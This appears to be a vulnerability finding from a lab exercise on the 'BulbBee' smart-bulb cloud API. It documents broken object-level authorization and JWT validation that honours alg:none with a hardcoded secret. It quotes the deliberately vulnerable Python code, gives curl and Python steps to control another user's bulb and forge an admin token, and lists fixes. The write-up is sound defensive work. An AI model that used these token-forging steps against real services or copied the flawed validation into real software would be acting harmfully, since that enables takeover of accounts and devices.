---
id: BULB-CLD
title: "Cloud API: BOLA on bulb control + broken authentication (alg:none / weak JWT)"
category: API
status: IN PROGRESS
severity: High
owasp: "API1:2023 - Broken Object Level Authorization / API2:2023 - Broken Authentication"
standard: "ETSI EN 303 645 5.5 (secure comms), 5.6 (minimise attack surface)"
regulation: "CRA (EU) 2024/2847 Annex I Part I - access control"
cwe: "CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-347 (Improper Verification of Cryptographic Signature) / CWE-798 (Use of Hard-coded Credentials)"
source_docs:
  - "stages/01_spec/output/bulbbee-cld-spec.md"
affected_components:
  - "cloud_api/bulbbee/api_server/app.py"
verified_date: "2026-09-04"
---

## Why It Matters

The BulbBee cloud lets the app control bulbs remotely. Two API weaknesses make that remote channel a free-for-all. First, the per-bulb control endpoints authorize by "is there a valid token", never by who owns the bulb (BOLA / API1), so any authenticated user drives any user's light. Second, the token validator honours the `none` algorithm and a weak hardcoded HS256 secret (API2), so an attacker forges an admin token with no key at all. Together they let a remote attacker enumerate and control every bulb in the fleet.

## Root Cause

Broken object-level authorization, the route checks the token decodes but never that the caller owns the bulb:

```python
@app.post("/api/bulb/<bulb_id>/state")
def set_state(bulb_id):
    claims = _auth()                 # only "is the token valid"
    if claims is None:
        return jsonify({"error": "unauthorized"}), 401
    b = BULBS.get(bulb_id)
    # VULNERABILITY (API1 / BOLA): no check that claims["sub"] owns bulb_id
    ...
```

Broken authentication, `alg:none` is honoured and the HS256 secret is weak and hardcoded:

```python
JWT_SECRET = "bulbbee-secret"        # weak, hardcoded (CWE-798)
def decode_token(token):
    header = jwt.get_unverified_header(token)
    if header.get("alg") == "none":
        return jwt.decode(token, options={"verify_signature": False}, algorithms=["none"])  # keyless forge
    return jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

## Steps to Reproduce

```sh
# 1. BOLA: log in as alice, control bob's bulb-2
TOK=$(curl -s -X POST http://CLOUD:5004/api/login -d '{"user":"alice"}' | jq -r .token)
curl -X POST http://CLOUD:5004/api/bulb/bulb-2/state -H "Authorization: Bearer $TOK" -d '{"power":true}'
# -> 200, bulb-2 (bob's) is now on

# 2. API2: forge an alg:none admin token (no key) and reach the admin view
python3 -c 'import jwt;print(jwt.encode({"sub":"x","role":"admin"},None,algorithm="none"))'
curl http://CLOUD:5004/api/admin/bulbs -H "Authorization: Bearer <forged-none-token>"
# -> 200, the whole fleet
```

## Expected Result

- alice's token controls bob's bulb (no ownership check).
- a forged `alg:none role:admin` token reaches `/api/admin/bulbs`, while a wrong-secret HS256 token is rejected.

## How It Should Be

- Check object ownership on every per-bulb route (`claims["sub"]` must own `bulb_id`), or scope tokens to owned objects.
- Reject `alg:none`, pin the accepted algorithm to HS256/RS256, and use a strong rotated secret / asymmetric keys.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Cloud (authz) | Per-object ownership check | Close BOLA (CWE-639) |
| Cloud (authn) | Reject `alg:none`, pin the algorithm | Close the keyless forge (CWE-347) |
| Cloud (authn) | Strong, rotated signing key | Remove the weak secret (CWE-798) |

## Verification Checklist

- [ ] alice's token drives `POST /api/bulb/bulb-2/state` (bob's bulb).
- [ ] a forged `alg:none role:admin` token reaches `GET /api/admin/bulbs`.
- [ ] a wrong-secret HS256 token is rejected.
